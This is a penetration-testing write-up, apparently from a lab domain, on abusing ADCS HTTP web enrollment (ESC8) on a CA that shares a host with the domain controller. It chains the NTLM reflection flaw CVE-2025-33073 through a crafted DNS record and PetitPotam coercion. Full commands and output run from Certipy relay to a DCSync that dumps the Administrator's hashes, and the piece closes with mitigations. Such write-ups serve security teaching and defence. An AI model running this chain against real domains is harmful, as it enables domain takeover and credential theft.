---
description: Abusing ADCS Web Enrollment for Domain Compromise
---

# ESC8 on a Shared CA

### Overview

In ADCS there are various ways through which a certificate can be enrolled including **RPC, DCOM, LDAP, SCEP** and **HTTP**. In **ESC8** the **HTTP** enrollment interface is abused to escalate privileges by relaying **NTLM** authentication from a privileged account to the **CA**, which issues a certificate that can then be used to authenticate as that account via **PKINIT**.

### Scenario

Recently I came across a situation where I had a foothold in the domain as a low-privileged user with no special privileges in the environment, No special group membership, no **DACL** rights, no writable objects and nothing obvious to escalate privileges to get Domain Admin. After gathering all the information I could I found that the user has the rights to Add a workstation in the Domain and Write a **DNS record** to the zone, both of which are default privileges that come with **AD** furthermore I also found out that there is **ADCS** setup in the environment the next logical step was to enumerate the **ADCS** and find any vulnerable template or privileges that could give an avenue of compromising the domain.

### CA Enumeration

Whenever there is **ADCS** enabled in a domain environment it's always a right approach to look for any vulnerabilities in the **CA** configurations and templates as well. **Certipy** is the ultimate toolkit when it comes to **ADCS.** It automates the process of finding vulnerable templates and misconfgurations in Certificate Authority that can be abused to escalate privileges. It also provides many other features and functions to facilitate the abuse of Certificate Services e.g Shadow Credentials, relay, etc



I used **Certipy** using the low-privileged credentials I had to enumerate and find any misconfiguration in the **CA** or Template.

```bash
certipy find -target DC01.adlab.kvm -u josh -p 3asyPass123 -k -dc-ip 192.168.122.3 -vulnerable -stdout
```

Above **Certipy** command enumerates and finds misconfigurations in the **CA** and certificate templates and flags any discovered misconfigurations that can be abused to escalate privileges.

```
Certipy v5.0.4 - by Oliver Lyak (ly4k)
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'adlab-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'adlab-DC01-CA'
[*] Checking web enrollment for CA 'adlab-DC01-CA' @ 'DC01.adlab.kvm'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : adlab-DC01-CA
    DNS Name                            : DC01.adlab.kvm
    Certificate Subject                 : CN=adlab-DC01-CA, DC=adlab, DC=kvm
    Certificate Serial Number           : 19EE5B218E9C8BB44547595BE3566515
    Certificate Validity Start          : 2026-04-25 02:00:15+00:00
    Certificate Validity End            : 2526-04-25 02:10:15+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : ADLAB.KVM\Administrators
      Access Rights
        ManageCa                        : ADLAB.KVM\Administrators
                                          ADLAB.KVM\Domain Admins
                                          ADLAB.KVM\Enterprise Admins
        ManageCertificates              : ADLAB.KVM\Administrators
                                          ADLAB.KVM\Domain Admins
                                          ADLAB.KVM\Enterprise Admins
        Enroll                          : ADLAB.KVM\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

Above output from **Certipy** shows that the Certificate Authority itself is vulnerable to **ESC8** due to Web Enrollment being enabled to HTTP which makes the **CA** vulnerable.

### Loopback Protection

Under normal conditions whenever a machine is coerced with itself it straight up refuses the request and doesn't initiate the authentication hence blocking the relay. This restriction in place prevents any machine in the domain to not authenticate with itself.&#x20;

In this scenario both the **DC** and **CA** are running on the same machine which rules out the straightforward **ESC8** relay from **DC** to **CA**. If the **CA** was to be a different server than the **DC** then the classic **ESC8** relay was possible but that's not the case here. CVE-2025-33073 provides a way to bypass this restriction

### CVE-2025-33073

CVE-2025-33073 is an NTLM reflection vulnerability discovered by researchers at Synacktiv in June 2025. NTLM reflection is not a new concept. Microsoft has been patching variations of it since MS08-068 in 2008, each time closing a specific vector while others remained. CVE-2025-33073 bypassed all existing mitigations through a logical flaw in how Windows handles DNS names containing marshalled target information.

Every authenticated domain user has permission to create DNS A records in AD-integrated DNS by default. The attack abuses this by creating a crafted DNS entry that appears to point to another machine but actually resolves to the attacker's IP. When coercion is triggered against the target, Windows processes the DNS name, strips the marshalled metadata, and compares only the hostname, concluding it is talking to a different machine when it is actually authenticating to itself. This bypasses the loopback restriction entirely.

### Exploitation

In the context of this scenario, **CVE-2025-33073** solves an **ESC8** blocker. When the **CA** and **DC** share the same host, **NTLM** relay to the **HTTP** enrollment endpoint is normally impossible due to loopback protection. But **CVE-2025-33073** makes it possible by adding a **DNS** record that looks like a different machine but actually resolves to the **DC's** hostname itself tricking the **DC** to authenticate against itself.

First of all we will add a malicious **DNS record** to exploit the **CVE** and make the **DC** coerce to itself.

```
bloodyad -H DC01.adlab.kvm -u josh -p 3asyPass123 -k -d adlab.kvm add dnsRecord 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 192.168.122.1
[+] DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully updated
```

After adding the record we will setup relay with **Certipy** which automatically relays the **NTLM** authentication to enroll a certificate. In this case we will enrolled the **DomainController** template to get a certificate for the **DC**.

```
sudo certipy relay -target http://DC01.adlab.kvm -template DomainController
```

After setting up relay we will coerce the **DC** using `petitpotam` to authenticate with the **DNS** record added earlier which is pointing to attack machine where the relay is running

```
nxc smb DC01.adlab.kvm -u josh -p 3asyPass123 -k -M coerce_plus -o L=DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA M=petitpotam
SMB         DC01.adlab.kvm 445    DC01        [*]  x64 (name:DC01) (domain:adlab.kvm) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC01.adlab.kvm 445    DC01        [+] adlab.kvm\josh:3asyPass123
COERCE_PLUS DC01.adlab.kvm 445    DC01        VULNERABLE, PetitPotam
COERCE_PLUS DC01.adlab.kvm 445    DC01        Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

after making the coercion the relay setup automatically enrolled the certificate for the **DC** which now can be used to authenticate and get the **NT** hash for **DC**.

```
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting http://DC01.adlab.kvm/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] (SMB): Received connection from 192.168.122.3, attacking target http://DC01.adlab.kvm
[*] HTTP Request: GET http://dc01.adlab.kvm/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc01.adlab.kvm/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc01.adlab.kvm/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@192.168.122.3 against http://DC02.adlab.kvm SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] (SMB): Received connection from 192.168.122.3, attacking target http://DC01.adlab.kvm
[*] HTTP Request: GET http://dc01.adlab.kvm/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc01.adlab.kvm/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] http:///@dc01.adlab.kvm [1] -> HTTP Request: POST http://dc01.adlab.kvm/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 88
[*] Retrieving certificate for request ID: 88
[*] http:///@dc01.adlab.kvm [1] -> HTTP Request: GET http://dc01.adlab.kvm/certsrv/certnew.cer?ReqID=88 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC01.adlab.kvm'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
[*] Exiting...
```

Above **Certipy** output shows that the relaying attempt was successful and the certificate for the **DC** was successfully saved. We can now use this certificate to authenticate and get the **NT** hash for the **DC** machine account.

```
certipy auth -pfx dc01.pfx -dc-ip 192.168.122.3
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.adlab.kvm'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc01$@adlab.kvm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@adlab.kvm': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

### DCSync

As this obtained **NT** hash is for the **DC** machine account it can be used to perform **DCSync** on the Domain and obtain the Domain Administrator's **NT** hash which can be used in Pass the Hash attack.

As **NTLM** authentication is disabled in the domain we need to first get a **TGT** using the **NT** hash and to authenticate against **Kerberos** with **RC4** and export the ticket to `KRB5CCNAME` variable here we can use **Impacket's** `getTGT.py` script to get a **TGT** for the **DC** account

```
getTGT.py 'adlab.kvm'/'DC01' -hashes :a65952c664e9cf5de60195626edbeee3 -dc-ip DC01.adlab.kvm
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in DC01.ccache
```

```
export KRB5CCNAME=./DC01.ccache
```

After exporting the ticket it can now be used to perform **DCSync** using `secretsdump.py`  and get the Administrator's credentials

```
secretsdump.py -k -no-pass DC01.adlab.kvm -just-dc-user administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up...
```

### Mitigation

Above attack demonstrated how **ESC8** can still be abused even if there is no other **DC** available to coerce and escalate privileges by leveraging a recent CVE.

Mitigation starts with patching. Applying the June 2025 Microsoft update for **CVE-2025-33073** adds validation in the SMB client to reject crafted DNS names containing marshalled target information, killing the reflection primitive entirely. For **ESC8** specifically, disable **HTTP** enrollment on the **CA** and enforce **HTTPS only**, this prevents **NTLM** relay to the enrollment endpoint regardless of how authentication is coerced. Additionally, restricting **DNS record** creation permissions for Authenticated Users removes the ability to plant the malicious **DNS** entry in the first place.

